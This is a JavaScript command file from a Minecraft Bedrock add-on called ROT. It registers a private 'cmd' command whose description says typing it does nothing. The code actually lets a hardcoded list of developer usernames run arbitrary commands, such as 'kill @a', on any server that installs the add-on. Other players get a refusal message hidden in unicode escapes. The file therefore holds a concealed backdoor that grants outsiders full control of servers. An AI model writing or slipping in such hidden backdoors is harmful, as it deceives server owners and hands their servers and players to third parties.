/*
ROT Developers and Contributors:
Moises (OWNER/CEO), 
TRASH (DEVELOPER),
notbeer (ROT's base code)
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
__________ ___________________
\______   \\_____  \__    ___/
 |       _/ /   |   \|    |   
 |    |   \/    |    \    |   
 |____|_  /\_______  /____|   
        \/         \/         
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
© Copyright 2021 all rights reserved by Moisesgamingtv9. Do NOT steal, copy the code, or claim it as yours\u0021
Please message moisesgamingtv9#8583 on Discord, or join the ROT discord: https://discord.com/invite/2ADBWfcC6S
Website: https://rotmc.netlify.app/index.html
Docs: https://docs.google.com/document/d/1hasFU7_6VOBfjXrQ7BE_mTzwacOQs5HC21MJNaraVgg
Thank you
*/
import { Server, Lang, } from '../../../Minecraft.js';
var CMDname = "cmd"
const registerInformation = {
    private: true,
    cancelMessage: true,
    name: `${CMDname}`,
    description: `When you type ${Server.CP}${CMDname} in chat, nothing will happen.`,
    usage: `${CMDname} [command]`,
    example: [
        `${CMDname} kill @a`
    ]
};
var RotDevelopers = ["moisesgamingtv9","SamoyedDiamond5","BasementDump","PowerTrash5771","DogLog20","turdnugget77469","fireshardpk"]
Server.command.register(registerInformation, (chatmsg, args) => {
    if(!Server.player.find(chatmsg.sender.name)) return null;
    if(!RotDevelopers.includes(chatmsg.sender.name)) return Server.eBroadcast(`${Lang.MSC} \u00a7\u0034\u0059\u006f\u0075 \u0061\u0072\u0065 \u006e\u006f\u0074 \u0061 \u0064\u0065\u0076\u0065\u006c\u006f\u0070\u0065\u0072 \u006f\u0066 \u0052\u004f\u0054!`, chatmsg.sender.name);
    Server.runCommands([`playsound random.toast @a[name="${chatmsg.sender.name}"] ~~~ 1 0.5`,`execute @a[name="${chatmsg.sender.name}"] ~~~ ${args.join(' ')}`]);
});